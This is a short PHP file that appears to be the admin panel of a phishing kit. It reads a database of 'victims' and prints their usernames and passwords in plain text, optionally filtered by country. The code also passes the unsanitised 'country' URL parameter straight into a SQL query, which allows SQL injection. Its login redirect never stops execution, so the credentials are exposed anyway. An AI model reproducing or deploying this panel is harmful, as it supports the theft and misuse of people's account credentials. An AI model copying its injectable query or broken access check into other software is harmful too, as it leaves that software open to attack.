<?php

require("conn.php");


session_start();
if(!isset($_SESSION['user_name']))
{
    header("Location: login.php");
}
$uniq_id = $_SESSION['user_name'];
//$serial = $_SESSION['serial'];
$filter_country = mysqli_query($con,"SELECT DISTINCT country FROM users ");

// Filter Commands
if(isset($_GET['country']))
{
    $country_selected = $_GET['country'];

    $fetch_victims = mysqli_query($con,"SELECT * FROM users WHERE country = '$country_selected' ORDER BY id DESC ");
}
else
{
    $fetch_victims = mysqli_query($con,"SELECT * FROM users");
}
// 

    

if(isset($_GET['country']))
{
    $country_selected = $_GET['country'];

            while($victim = mysqli_fetch_array($fetch_victims ))
            {
     
    //  echo $victim['vic_country'];
//echo':';
     echo $victim['user'] ;
     echo':';
    echo $victim['pass'];
     echo'<br>';
 }
}
else
{
      while($victim = mysqli_fetch_array($fetch_victims ))
            {
     
      echo $victim['country'];
      echo':';
     echo $victim['user'] ;
      echo':';
   echo $victim['pass'];
     echo'<br>';}
}
//
?>